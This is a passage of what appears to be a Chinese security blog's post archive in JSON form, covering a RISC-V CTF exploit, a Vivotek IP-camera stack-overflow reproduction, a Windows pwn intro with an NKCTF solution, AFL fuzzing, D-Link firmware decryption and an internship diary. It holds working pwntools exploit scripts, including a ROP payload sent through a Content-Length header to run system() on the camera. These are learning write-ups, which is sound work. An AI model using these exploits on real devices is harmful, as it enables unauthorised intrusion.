io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()backdoor=0x123456eeru(&#x27;Input ur name:&#x27;)payload=b&#x27;A&#x27;*8s(payload)ru(&quot;Input ur words&quot;)payload=b&#x27;A&#x27;.ljust(0x100,b&#x27;A&#x27;)+p64(backdoor)s(payload)sleep(0.5)sl(b&#x27;cat fl*&#x27;)ia()\n\n调试技巧其实本题并不需要调试，只需要把题目的逻辑大概都理清楚，就可以将exp写出来了。但是为了防止以后再遇到riscv64的题目，还是需要学习一下。\n听z1r0师傅说pwndbg是不支持riscv64架构的调试，需要去修改源码，并且修改地方比较多(太菜了，选择放弃这种方法)\n然后刚好b站上又有国资师傅讲的异构课，重新听了一遍记录下riscv64的调试过程\n首先是运行riscv64程序的命令\nqemu-riscv64-static -L /usr/riscv64-linux-gnu/ ./pwn\n\n调试命令:\nqemu-riscv64-static -L /usr/riscv64-linux-gnu/ -g 1234 ./pwn\n\n然后使用gdb-multiarch连接端口进行调试\ngdb-multiarch pwnset architecture riscv:rv64target remote 0.0.0.0:1234\n\n\n可以看到pwndbg报错，本应该出现的信息都没有弹出来，这里只能使用gdb本身的几个命令来查看栈上的信息以及程序运行所在的地址\n首先是正常下断点，将断点下在strcpy的后面\nb *123457e0\n\n接着c过去，可以看到什么信息都没有弹出来\n\n这里可以使用x&#x2F;20i $pc,来查看程序运行到哪了\n\n也可以用i r来查看所有寄存器的状态\n\n使用x&#x2F;40gx $sp查看此时栈上的状态\n\n这里查看汇编，并且调试验证也可以得出本题会将sp+280处的数据给ra作为ret的返回值，并且输入点在$sp+0x18的位置处，所以可以得出溢出长度为0x100的结论。\n\n"},{"title":"vivotek摄像头栈溢出漏洞复现","url":"/2024/03/22/vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"参考链接:\nhttps://p1kk.github.io/2021/04/14/iot/vivotek%20%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/\nhttps://github.com/Vu1nT0tal/IoT-vulhub/tree/master/VIVOTEK/remote_stack_overflow\n环境模拟首先用binwalk解包会获得一个比较复杂的目录，先找下squashfs在哪\nyoulin@ubuntu:~/rw/VIVOTEK/remote_stack_overflow/firmware/_CC8160-VVTK-0100d.flash.pkg.extracted$ find -name squ*./_31.extracted/_rootfs.img.extracted/squashfs-root-0./_31.extracted/_rootfs.img.extracted/squashfs-rootyoulin@ubuntu:~/rw/VIVOTEK/remote_stack_overflow/firmware/_CC8160-VVTK-0100d.flash.pkg.extracted$\n\n然后就是确认下架构\n\n这里我选择的是用qemu的系统级模拟，设置好网卡后，将文件系统上传，然后挂载一下&#x2F;dev和&#x2F;proc\nmount -t proc /proc ./squashfs-root/procmount -o bind /dev ./squashfs-root/dev\n\n接着就可以尝试启动httpd服务了\n\n看到上面报错，在ida中查一下boa.conf的路径\n\n在我们binwalk解包出来的文件中也有这个，直接将一整个目录传到对应的地方去\n\n然后报错就变成这个了，在ida中找会触发这个报错的地方\n\n利用了gethostbyname()函数，返回rlimits结构体中通过主机名找到的ip地址，像下面这样改就可以了，这样httpd服务就已经跑起来了\n\n漏洞分析以及调试一个strncpy造成的栈溢出漏洞\n\n\nstrncpy()用来复制字符串的前n个字符，其原型为：char * strncpy(char *dest, const char *src, size_t n);\n【参数说明】dest 为目标字符串指针，src 为源字符串指针。\nstrncpy()会将字符串src前n个字符拷贝到字符串dest。\n不像strcpy()，strncpy()不会向dest追加结束标记’\\0’，这就引发了很多不合常理的问题，将在下面的示例中说明。\n注意：src 和 dest 所指的内存区域不能重叠，且 dest 必须有足够的空间放置n个字符。\n【返回值】返回字符串dest。\n\nstrchr() 用来查找某字符在字符串中首次出现的位置，其原型为：char * strchr (const char *str, int c);\n【参数】str 为要查找的字符串，c 为要查找的字符。\nstrchr() 将会找出 str 字符串中第一次出现的字符 c 的地址，然后将该地址返回。\n注意：字符串 str 的结束标志 NUL 也会被纳入检索范围，所以 str 的组后一个字符也可以被定位。\n【返回值】如果找到指定的字符则返回该字符所在地址，否则返回 NULL。\n返回的地址是字符串在内存中随机分配的地址再加上你所搜索的字符在字符串位置。设字符在字符串中首次出现的位置为 i，那么返回的地址可以理解为 str + i。\npoc:\n\n\nfrom pwn import *import requestsheader = &#123;\t&quot;Content-Length&quot;:&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&quot;&#125;url = &quot;http://192.168.65.2&quot; + &quot;/cgi-bin/admin/upgrade.cgi&quot;session = requests.session()session.post(url, headers=header)\n\n这里可以测出溢出的长度是51，接着就是考虑arm的栈溢出利用了\n漏洞利用其实在测出溢出的长度是51之后，利用都比较简单了，但是需要注意的是因为造成溢出的是strncpy函数，所以payload当中不能有’\\x00’,于是只能将aslr关掉之后用libc当中的gadget，并且不能直接用pop {r0,pc}这个gadget，地址当中含有\\x00\n\n所以选择用pop {r1,pc}和mov r0,r1来代替\n\nexp:\nfrom pwn import *import requestslibc=ELF(&quot;libuClibc-0.9.33.3-git.so&quot;)libcbase=0x76f2d000pop_r0=libcbase+0x00033100pop_r1=libcbase+0x00048784mov_r0_r1=0x00016aa4+libcbase #mov r0, r1; pop &#123;r4, r5, pc&#125;;system=libcbase+libc.sym[&#x27;system&#x27;]cmd_addr=0x7effeb74cmd=b&#x27;echo &quot;pwned_sucess&quot; &gt; /tmp/test.txt;&#x27;payload=b&#x27;A&#x27;*51+p32(pop_r1)+p32(cmd_addr)+p32(mov_r0_r1)+b&#x27;A&#x27;*8+p32(system)+cmd#payload=b&#x27;A&#x27;*51+b&#x27;B&#x27;*4header = &#123;\t&quot;Content-Length&quot;:payload&#125;url = &quot;http://192.168.182.111&quot; + &quot;/cgi-bin/admin/upgrade.cgi&quot;session = requests.session()session.post(url, headers=header)\n\n\n"},{"title":"winpwn入门","url":"/2024/04/07/winpwn%E5%85%A5%E9%97%A8/","content":"前言nkctf刚好有一道winpwn的题，题目比较简单就顺便学了一下，主要是一些调试还有攻击的技巧\n参考:\nz1r0\n安装checksechttps://github.com/Wenzel/checksec.py\n到他的releases下载checksec.exe\n\n安装winserverhttps://github.com/Ex-Origin/win_server\n这个就像搭建pwn题一样，把exe给映射到一个端口上\ngit clone https://github.com/Ex-Origin/win_server.git\n\n如上git clone之后即可使用，用法：.\\win_server.exe a.exe 1234就可以把a.exe给映射到1234端口上，试着用nc连接一下，发现可以正常的执行程序\n\n这样就可以正常使用pwntools去做winpwn了，同样也方便使用ida调试程序\nwinpwn保护机制NX：这个在win上其实是DEP，堆栈不可执行保护\nCanary：这个在win上其实是GS，可能这个工具的开发者为了让我们更好理解才写了Canary，但是需要注意的是这个工具的canary检测可能检测不准\nASLR：通俗讲就是地址随机化，让exe和dll的地址全部随机，所以就有了大名鼎鼎Heap Spray（堆喷）利用技术，Heap Spray是在shellcode的前面加上大量的slide code（滑板指令），组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。\nDynamic Base：程序编译时可通过&#x2F;DYNAMICBASE编译选项指示程序是否利用ASLR的功能\nHigh Entropy VA：如果指定此选项，则当内核将进程的地址空间布局随机化为 ASLR 的一部分时，兼容版本的 Windows 内核可以使用更高的熵。 如果内核使用更高的熵，则可以将更多的地址分配给堆栈和堆等内存区域。 因此，更难猜测特定内存区域的位置。当该选项打开时，当这些模块作为 64 位进程运行时，目标可执行文件和它所依赖的任何模块必须能够处理大于 4 GB 的指针值。\nSEH：结构化异常处理（Structured Exception Handling，简称 SEH）是一种Windows 操作系统对错误或异常提供的处理技术。SEH 是 Windows操作系统的一种系统机制，本身与具体的程序设计语言无关。SEH 为Windows的设计者提供了程序错误或异常的处理途径，使得系统更加健壮\nSafeSEH：为了防止攻击者通过覆盖堆栈上的异常处理函数句柄，从而控制程序执行流程的攻击，在调用异常处理函数之前，对要调用的异常处理函数进行一系列的有效性校验，如果发现异常处理函数不可靠，立即终止异常处理函数的调用。不过SafeSEH需要编译器和系统双重支持，缺少一个则保护能力基本就丧失了\nForce Integrity：强制签名保护\nControl Flow Guard：控制Flow防护 (CFG) 是一项高度优化的平台安全功能，旨在打击内存损坏漏洞。 通过严格限制应用程序可以从何处执行代码，利用漏洞（如缓冲区溢出）执行任意代码会更加困难\nIsolation：隔离保护，默认会开启\nAuthenticode：签名保护\nida调试ida直接调试程序先F2下个断点\n\nF9选择Local Windows debugger，然后OK就行了\n\n这里就可以开始调试了\n\n结合exp调试这里选择attach to process，然后用前面的winserver把服务跑起来，在虚拟机里面跑exp，连接上程序，然后选择对应的进程就可以调试了\n\n这里可以看到已经调试到我们exp跑的对应的进程里面去了\n\n\n例题:NKCTF2024 签到明显的有格式化字符串和栈溢出漏洞，因为不太清楚winpwn的libc的格式，所以这里没用格式化字符串漏洞去泄露libc，这里笔者选择了先用格式化字符串漏洞泄露出canary，然后rop泄露出puts的真实地址(这里需要注意的是winpwn不知道为什么无法使用%x$p)，必须输入一长串的%p才能够泄露\n\n然后题目也给了msvcrt.dll，用ida把puts,system,cmd.exe的偏移都找出来，然后直接写rop就行了\nfrom pwn import *from ctypes import *from struct import pack#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;192.168.3.113&#x27;port = 1234local = 0if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()puts_plt=0x0403F8Cputs_got=0x0409230pause()ru(&quot;NKCTF2024\\r\\n&quot;)payload=b&#x27;%p&#x27;*0x1e+b&#x27;S&#x27;+b&#x27;%p&#x27;sl(payload)ru(b&#x27;S&#x27;)canary=int(io.recv(8),16)lg(&quot;canary&quot;)ru(&quot;ohhh,no&quot;)payload=b&#x27;A&#x27;*(0x70-0xc)+p32(canary)+b&#x27;A&#x27;*8+b&#x27;A&#x27;*4+p32(puts_plt)+p32(0x00401473)+p32(puts_got)sl(payload)&quot;&quot;&quot;#remotedll_base=u32(io.recv(4))-0x1017BA80lg(&quot;dll_base&quot;)system=dll_base+0x10144700cmd=dll_base+0x101048C8&quot;&quot;&quot;#localdll_base=u32(io.recv(4))-0x10179E20lg(&quot;dll_base&quot;)system=dll_base+0x10143D30cmd=dll_base+0x101047A4ru(&quot;NKCTF2024\\r\\n&quot;)payload=b&#x27;%p&#x27;*0x1e+b&#x27;S&#x27;+b&#x27;%p&#x27;sl(payload)pause()ru(&quot;ohhh,no&quot;)payload=b&#x27;A&#x27;*(0x70-0xc)+p32(canary)+b&#x27;A&#x27;*8+b&#x27;A&#x27;*4+p32(system)+p32(0)+p32(cmd)sl(payload)ia()\n\n这里还要注意的是需要把debug打开来，然后用type flag.txt才能看到flag，不知道是不是因为编码格式的问题，不开debug是看不到打印出来的字符串的\n"},{"title":"初探afl-fuzz","url":"/2024/01/13/%E5%88%9D%E6%8E%A2afl-fuzz/","content":"前言早就想开始学习fuzz了，结果拖了得有半年了。一方面是源码的阅读能力太弱，另一方面可能还是对于学习投入的精力不太够吧。甚至期间九哥还请hollk师傅做过一次fuzz的讲解，可惜当时学习了一下基本用法之后就没有再进行深入的学习了。\n本篇文章主要还是讲解afl-fuzz的一个基本用法\n参考文章:\nhttps://xz.aliyun.com/t/4314?time__1311=n4%2BxnD0D9DgDcBQKDtD%2Fia4BKmqE%3DWDI2hhrrD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F\nhttps://tttang.com/archive/1508/\nAFL-Fuzz介绍Fuzzing是指通过构造测试输入，对软件进行大量测试来发现软件中的漏洞的一种模糊测试方法。在CTF中，fuzzing可能不常用，但在现实的漏洞挖掘中，fuzzing因其简单高效的优势，成为非常主流的漏洞挖掘方法。\nAFL则是fuzzing的一个很好用的工具，全称是American Fuzzy Lop，由Google安全工程师Michał Zalewski开发的一款开源fuzzing测试工具，可以高效地对二进制程序进行fuzzing，挖掘可能存在的内存安全漏洞，如栈溢出、堆溢出、UAF、double free等。由于需要在相关代码处插桩，因此AFL主要用于对开源软件进行测试。当然配合QEMU等工具，也可对闭源二进制代码进行fuzzing，但执行效率会受到影响\n工作原理：\n通过对源码进行重新编译时进行插桩（简称编译时插桩）的方式自动产生测试用例来探索二进制程序内部新的执行路径。AFL也支持直接对没有源码的二进制程序进行测试，但需要QEMU的支持。\nAFL界面介绍\nprocess timing这里展示了当前fuzzer的运行时间、最近一次发现新执行路径的时间、最近一次崩溃的时间、最近一次超时的时间。\n值得注意的是第2项，最近一次发现新路径的时间。如果由于目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的，所以如果从fuzzing开始一直没有发现新的执行路径，那么就要考虑是否有二进制或者命令行参数错误的问题了。对于此状况，AFL也会智能地进行提醒\noverall results这里包括运行的总周期数、总路径数、崩溃次数、超时次数。\n其中，总周期数可以用来作为何时停止fuzzing的参考。随着不断地fuzzing，周期数会不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。一般来说，当其变为绿色时，代表可执行的内容已经很少了，继续fuzzing下去也不会有什么新的发现了。此时，我们便可以通过Ctrl-C，中止当前的fuzzing\nstage progress这里包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度\n执行速度可以直观地反映当前跑的快不快，如果速度过慢，比如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing\n以上是简单的介绍，如果要看完整的可以查看官方的文档\n安装先进入官网进行源码下载:https://gitcode.com/mirrors/google/afl/overview\n进行编译，以及后续的源码阅读\nmakesudo make install\n\n输入以上命令后基本就能安装成功了，在终端输入afl-后tab，就能出现以下这些命令了\n\n使用AFL插桩程序（有源码）选择的是afl-training当中的quickstart\nquickstart通过fuzz一个简单的demo来体验afl的使用过程。\n编译demo的方法是：\ncd quickstartCC=afl-clang-fast AFL_HARDEN=1 make\n\nmake默认会编译all，all编译的是vulnerable，所以最终会形成afl-clang-fast -g -w vulnerable.c -o vulnerable。\nvulnerable.c代码如下所示：\n$ cat vulnerable.c#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#define INPUTSIZE 100int process(char *input)&#123;        char *out;        char *rest;        int len;        if (strncmp(input, &quot;u &quot;, 2) == 0)        &#123; // upper case command                char *rest;                len = strtol(input + 2, &amp;rest, 10); // how many characters of the string to upper-case                rest += 1;                                                      // skip the first char (should be a space)                out = malloc(len + strlen(input));  // could be shorter, but play it safe                if (len &gt; (int)strlen(input))                &#123;                        printf(&quot;Specified length %d was larger than the input!\\n&quot;, len);                        return 1;                &#125;                else if (out == NULL)                &#123;                        printf(&quot;Failed to allocate memory\\n&quot;);                        return 1;                &#125;                for (int i = 0; i != len; i++)                &#123;                        out[i] = rest[i] - 32; // only handles ASCII                &#125;                out[len] = 0;                strcat(out, rest + len); // append the remaining text                printf(&quot;%s&quot;, out);                free(out);        &#125;        else if (strncmp(input, &quot;head &quot;, 5) == 0)        &#123; // head command                if (strlen(input) &gt; 6)                &#123;                        len = strtol(input + 4, &amp;rest, 10);                        rest += 1;                // skip the first char (should be a space)                        rest[len] = &#x27;\\0&#x27;; // truncate string at specified offset                        printf(&quot;%s\\n&quot;, rest);                &#125;                else                &#123;                        fprintf(stderr, &quot;head input was too small\\n&quot;);                &#125;        &#125;        else if (strcmp(input, &quot;surprise!\\n&quot;) == 0)        &#123;                // easter egg!                *(char *)1 = 2;        &#125;        else        &#123;                return 1;        &#125;        return 0;&#125;int main(int argc, char *argv[])&#123;        char *usage = &quot;Usage: %s\\n&quot;                                  &quot;Text utility - accepts commands and data on stdin and prints results to stdout.\\n&quot;                                  &quot;\\tInput             | Output\\n&quot;                                  &quot;\\t------------------+-----------------------\\n&quot;                                  &quot;\\tu &lt;N&gt; &lt;string&gt;    | Uppercased version of the first &lt;N&gt; bytes of &lt;string&gt;.\\n&quot;                                  &quot;\\thead &lt;N&gt; &lt;string&gt; | The first &lt;N&gt; bytes of &lt;string&gt;.\\n&quot;;        char input[INPUTSIZE] = &#123;0&#125;;        // Slurp input                if (read(STDIN_FILENO, input, INPUTSIZE) &lt; 0)        &#123;                fprintf(stderr, &quot;Couldn&#x27;t read stdin.\\n&quot;);        &#125;        int ret = process(input);        if (ret)        &#123;                fprintf(stderr, usage, argv[0]);        &#125;;        return ret;&#125;\n\n看起来程序获取来输入后调用process函数进行处理，根据输入的不同进行不同的处理：\nu  ：对字符串的前n个字节变成大写字符串；head  ：截取字符串的前n个字符；surprise!：隐藏功能，直接触发崩溃。运行afl-fuzz对程序进行测试：\nafl-fuzz -i inputs -o out ./vulnerable\n\ninputs目录是输入的种子目录，由用户提供，应该是精心准备的样本以有效提高fuzz效率，可以看到系统提供的inputs目录中包含触发u和head的样例：\nyoulin@ubuntu:~/afl/afl-training/quickstart$ lsafl-screenshot.png  inputs  Makefile  out  README.md  vulnerable  vulnerable.cyoulin@ubuntu:~/afl/afl-training/quickstart$ ls inputs/head  uyoulin@ubuntu:~/afl/afl-training/quickstart$ cat inputs/head head 20 This string is going to be truncated at the 20th position.youlin@ubuntu:~/afl/afl-training/quickstart$ cat inputs/uu 4 capsmeyoulin@ubuntu:~/afl/afl-training/quickstart$ \n\nfuzz结果(当时让他fuzz之后就去干其他事情了，其实很快就fuzz好了):\n\nout有相应的产出，其中crashes目录存储的是崩溃样本；queue目录存储的是成果触发新路径的样本即有趣的样本。\n\ncrash输入演示\n\n使用AFL插桩程序（无源码）使用的是hollk师傅提供的RV130X_FW_1.0.3.55.bin固件，首先使用binwalk解包\nbinwalk -Me RV130X_FW_1.0.3.55.bin\n\n可以解出完整的文件系统\n\n然后使用qemu用户态模拟看jsonparse的输入格式\nyoulin@ubuntu:~/rw/黑盒/_RV130X_FW_1.0.3.55.bin.extracted$ qemu-arm-static -L ./squashfs-root/ ./squashfs-root/usr/sbin/jsonparse usage: jsonparse [file]Below is a sample parse result:test2() json_object_get_string(input)=&#123; &quot;pagination_response_record&quot;: &#123; &quot;page_index&quot;: &quot;1&quot;, &quot;last_index&quot;: &quot;1&quot;, &quot;total_records&quot;: &quot;2&quot;, &quot;self_link&quot;: &quot;https:\\/\\/api-stage.cisco.com\\/software\\/stage\\/v2.0\\/metadata\\/udi\\/NAME:RV215W,DESCR:Cisco RV215W Wireless N VPN Firewall, PID:RV215W-A-K9-NA, VID:V01, SN:CCQ163612VP\\/mdf_id\\/284436489\\/software_type_id\\/282487380\\/current_release\\/7.0.220.0?output_release=LATEST&quot;, &quot;page_records&quot;: &quot;25&quot;, &quot;title&quot;: &quot;Get Metadata by UDI, MDF ID &amp; Image Names â&lt;80&gt;&lt;93&gt; Download API&quot; &#125;, &quot;metadata_response&quot;: &#123; &quot;metadata_trans_id&quot;: &quot;9746&quot;, &quot;metadata_id_list&quot;: &#123; &quot;udi&quot;: &quot;NAME:RV215W,DESCR:Cisco RV215W Wireless N VPN Firewall, PID:RV215W-A-K9-NA, VID:V01, SN:CCQ163612VP&quot;, &quot;mdf_id&quot;: &quot;284436489&quot;, &quot;software_list&quot;: &#123; &quot;platform_list&quot;: [ &#123; &quot;release_list&quot;: [ &#123; &quot;release_version&quot;: &quot;1.1.0.5&quot;, &quot;release_fcs_date&quot;: &quot;2013-04-10 00:00:00.0&quot;, &quot;image_details&quot;: [ &#123; &quot;image_guid&quot;: &quot;8893B41F4FD3DF71FA3D03B636205BD613BEE766&quot;, &quot;related_image&quot;: &quot;N&quot;, &quot;image_name&quot;: &quot;RV215W_FW_1.1.0.5.bin&quot;, &quot;image_size&quot;: &quot;10912768&quot;, &quot;image_checksums&quot;: &#123; &quot;md5_checksum&quot;: &quot;0e1792082f4a13b8eb256e92ff5ce501&quot; &#125;, &quot;image_description&quot;: &quot;RV215W_FW_1.1.0.5.bin&quot;, &quot;encryption_software_indicator&quot;: &quot;Y&quot;, &quot;image_level_docs&quot;: null &#125;, &#123; &quot;image_guid&quot;: &quot;187A05709F5BDEEEE38E4002AE014F4659859C2B&quot;, &quot;related_image&quot;: &quot;N&quot;, &quot;image_name&quot;: &quot;USB_dynamic_module_file.zip&quot;, &quot;image_size&quot;: &quot;116182&quot;, &quot;image_checksums&quot;: &#123; &quot;md5_checksum&quot;: &quot;1d6f78a9edbea935026bb8a2be5cc715&quot; &#125;, &quot;image_description&quot;: &quot;The USB dynamic module files of RV215W 1.1.0.5 version&quot;, &quot;encryption_software_indicator&quot;: &quot;Y&quot;, &quot;image_level_docs&quot;: null &#125; ], &quot;release_level_docs&quot;: &#123; &quot;release_doc_name&quot;: &quot;Release Notes and Open Source Documentation for 1.1.0.5&quot;, &quot;release_doc_url&quot;: &quot;http:\\/\\/www.cisco.com\\/en\\/US\\/products\\/ps9923\\/prod_release_notes_list.html&quot;, &quot;release_doc_type&quot;: &quot;null&quot; &#125;, &quot;security_advisory&quot;: &quot;\\/en\\/US\\/products\\/ps9923\\/prod_security_advisories_list.html&quot; &#125; ] &#125; ], &quot;software_type_id&quot;: &quot;282487380&quot;, &quot;software_type_name&quot;: &quot;Wireless Router Firmware&quot; &#125;, &quot;mdf_concept_name&quot;: &quot;Cisco RV215W Wireless-N VPN Router&quot; &#125; &#125;, &quot;service_status&quot;: &#123; &quot;status&quot;: &quot;success&quot; &#125; &#125;\n\n根据hollk师傅所说尽量用短一点的数据进行模糊测试，所以使用下面的数据\n\n接着就是fuzz了\nQEMU_LD_PREFIX=./squashfs-root/ ~/tools/AFLplusplus-stable/afl-fuzz -Q -i ./input/ -o ./output/ -- ./squashfs-root/usr/sbin/jsonparse @@\n\n可以看到还没跑多久就跑出了两个crashes,直接ctrl+c终止，在output目录下看看两个crashes\n\n\n直接看，我还是有点看不懂，建议直接放到程序去跑一遍\nqemu-arm-static -L ./squashfs-root/ ./squashfs-root/usr/sbin/jsonparse ./output/default/crashes/id\\:000000\\,sig\\:11\\,src\\:000000\\,time\\:48\\,execs\\:89\\,op\\:havoc\\,rep\\:8\n\n\n可以看到程序是存在栈溢出的，利用的话就得具体分析了\n"},{"title":"固件解密学习","url":"/2023/11/16/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%AD%A6%E4%B9%A0/","content":"固件解密思路学习固件例子:https://support.dlink.com/ProductInfo.aspx?m=DIR-822-US\n\n先试用：binwalk -E DIR822C1_FW3，指令查看固件的熵值，发现几乎恒定在1左右，意味着可能对固件的不同部分内容进行了加密\n\n在官网给出的文档中，有提到firmware v303WWb04_middle这个中间版本，因此我们需要想办法下载这个中间版本\n\ndlink有提供一个FTP服务器来下载固件，但是我貌似不会用(悲)，我这里是在异步社区下载的这个中间版本\nhttps://box.lenovo.com/l/8ufzWe\n将这个中间版本下载之后使用binwalk进行解包，发现能获得一个完整的文件系统\n使用grep命令在squashfs-root搜索update,firmware,upgrade,download等关键的字符串\ngrep -r Download\n\n通过对下图进行分析，发现在etc&#x2F;templates&#x2F;hnap目录下存在StartFirmwareDownload.php文件，有Download字符串\n打开StartFirmwareDownload.php文件，发现有一行注释为fw encimg \n\n可以看到这断代码执行了几个操作:首先使用cat命令读取&#x2F;etc&#x2F;config&#x2F;image_sign的值并赋值给$iamge_sign变量;然后使用fwrite执行了encimg -d -i “.$fw_path.” -s “.$image_sign.\n首先查看&#x2F;etc&#x2F;config&#x2F;image_sign的值\n\n内容为wrgac43s_dlink.2015_dir822c1，也就是$image_sign变量的值。下一步就是运行encimg文件，因此查找encimg文件，并确定encimg的文件信息\n\n可以看到程序为mips大端序架构，将qemu-mips-static移动到当前目录下。使用qemu进行模拟运行\n\n发现需要添加几个参数才能正常运行，encimg -d -i “.$fw_path.” -s “.$image_sign.，在之前的代码中可以知道fw_patch为加密的固件的路径，image_sign为之前读到的值wrgac43s_dlink.2015_dir822c1\n\n至此固件已经解密成功，后面就可以正常binwalk解包进行分析然后挖洞了\n"},{"title":"实习总结","url":"/2023/09/25/%E5%AE%9E%E4%B9%A0%E6%80%BB%E7%BB%93/","content":"感想不得不感叹时间过得很快呀，不知不觉就已经大三了。去年看toka实习总结的时候好像都还没过去多久？转眼自己的大二实习都已经结束了。\n还是比较幸运能够有机会来广州实习，一开始自己大二的计划是在这个暑假好好学学iot和渗透的并没有什么想法出来实习，所以也并没有把自己的简历往外投递(hhh，其实我都还没有开始写一份自己的简历)可能转折点就是5月份左右看到有师傅在群里问有没有pwn师傅有时间出题目吧，当时可能很多师傅都在准备期末考试和比赛？然后自己就揽下了这个活(这个时候就不得不感叹钱果然才是最能催促人学习的)，大概一两天就把关于出pwn题的docker使用给学会了吧。然后在大概6月份的时候就问我有没有时间来广州实习，并且说是实习没有什么事，时间比较自由，最后几番拉扯最后还是过来了吧。(时间确实比较自由，两个月的上班时间绝大部分时间都是在干自己的事情）并且同事和公司氛围都还比较满意(最主要包住真的能省掉很多事情)广州这边的生活节奏貌似也要比北上深更舒服一点，哪怕是3k一个月也能比较滋润了(包住的情况下，不包住的话可能就得稍微省着点花了)\n对于我来说可能真的是扩宽了眼界了吧，出来实习以前甚至江西都没出过几次，大部分时间都是待在小县城里，哪怕是大学也是在江西的某个犄角嘎达，荒郊野岭的地方，第一次在一个一线城市生活了这么久，感受一个完全不同的城市的生活习惯(广州无辣椒，我和湖南一起来的同事一致认为广州的辣椒少的可怜，绝大部分菜都是无辣味)。还很幸运的有机会到现成看了两场广州队的足球比赛(广州队的主场氛围是真的很好，哪怕是降级到了中甲你也能够看到几k个人全场90分钟时间不断的为场上的队员加油助威，遗憾的是两场比赛都没有看到广州队获得一场胜利，也没有一个进球，感觉胜利或者进球之后广州队的球迷真的能疯狂的嗨起来吧，hhh，已经被广州队迷住了希望以后还有机会到现场看广州队踢中超)\n公司氛围感觉待的公司还是很不错的，小公司相对来说也要比大公司更自由一点，加班也比较少(反正我没有过，也没怎么看到过其他同事需要加班)看了其他的一些师傅们实习(特别是toka)好像几乎每天都需要加班？而且就这个公司来说的话还经常有福利偶尔会有同事请喝奶茶还有小吃，同事之间的交流也比较融洽，一起住的同事也比较好经常会请我和另外一个一起来实习的喝喝奶茶，吃饭啥的，也会和我们聊聊对这个行业的一些理解。\n工作内容找到的工作虽然说是安全岗位，其实公司给的任务其实只有CTF培训和比赛出题还有打比赛。然后其余大部分时间都是在公司自己学习(貌似对于我来说的话，学习时间要比待家里更多了,因为家里总会有各种各样的事情)幸运的是两个月时间在z1r0师傅和izeroo师傅的帮助下也算是初步掌握了挖掘路由器漏洞的一些技巧，还有在pursue师傅的一些建议下也是刷了几台vulnhub的靶机(希望这个可以一直坚持下去)\n总结与唠叨？对于从小县城走出来的我这次出来实习还是学习到了很多东西，也有了很多对这个安全行业的新的认知。也尝试了很多第一次，第一次坐飞机，第一次进京，第一次到南京(hhh，其实只是到南京转了下机)感受了下大城市的生活节奏(早晚高峰地铁是真的挤，我甚至坐的不是最多人的三号线)还有北京的小震撼，高速进京每个人都得查身份证(北京到处都查身份证，不带身份证感觉去哪都有点不方便了)。最主要的学习所得还是培训的经验吧（希望以后还能恰点这个钱）还有路由器的漏洞挖掘经验(给zer0师傅和izeroo师傅磕两个)还对渗透有了大概的一个认知(一个与CTF可以说是完全不同的方向了)\n"},{"title":"天融信车联网CTF总结","url":"/2023/09/25/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%BD%A6%E8%81%94%E7%BD%91CTF%E6%80%BB%E7%BB%93/","content":"easy_guess这道题没有什么考点，直接写随机数就行了\nexp:\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./easyguess&quot;elf = ELF(banary)#libc = ELF(&quot;./libc.so.6&quot;)libc=cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;123.127.164.29&#x27;port = 26921local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : 